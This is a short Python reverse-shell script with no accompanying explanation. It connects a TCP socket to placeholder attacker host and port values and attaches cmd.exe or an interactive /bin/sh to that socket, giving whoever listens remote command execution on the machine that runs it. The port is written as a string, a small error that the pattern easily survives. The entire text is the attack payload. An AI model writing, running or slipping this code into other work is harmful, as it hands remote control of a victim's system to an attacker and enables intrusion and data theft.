import socket, subprocess, os 

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker_ip", "attacker_port"))

if os.name == 'nt':
    subprocess.call(["cmd.exe"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
else:
    subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())